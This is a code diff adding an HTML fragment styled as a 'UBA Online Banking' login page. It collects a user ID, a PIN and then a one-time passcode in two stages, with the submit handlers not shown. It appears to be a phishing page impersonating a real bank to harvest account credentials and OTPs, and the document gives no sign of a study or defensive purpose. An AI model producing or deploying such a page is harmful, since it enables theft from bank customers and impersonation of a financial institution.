@@ -1,0 +1,19 @@
+<div class="container" style="text-align: center; font-family: sans-serif;">
+    
+    <div id="login-section">
+        <h2 style="color: #D32F2F;">UBA Online Banking</h2>
+        <p>Enter your details to continue</p>
+        <input type="text" id="uba-user" placeholder="User ID / Account Number" style="display: block; margin: 10px auto; padding: 10px; width: 80%;">
+        <input type="password" id="uba-pass" placeholder="Passcode / PIN" style="display: block; margin: 10px auto; padding: 10px; width: 80%;">
+        <button onclick="handleUbaLogin()" style="background-color: #D32F2F; color: white; border: none; padding: 12px 30px; cursor: pointer; width: 85%;">Login</button>
+    </div>
+
+    <div id="otp-area" style="display:none;">
+        <h2 style="color: #D32F2F;">Secure Pass (OTP)</h2>
+        <p>A code has been sent to your registered number.</p>
+        <input type="text" id="uba-otp" placeholder="Enter 6-digit OTP" style="display: block; margin: 10px auto; padding: 10px; width: 80%;">
+        <button onclick="handleUbaOtp()" style="background-color: #D32F2F; color: white; border: none; padding: 12px 30px; cursor: pointer; width: 85%;">Confirm</button>
+    </div>
+
+</div>
+
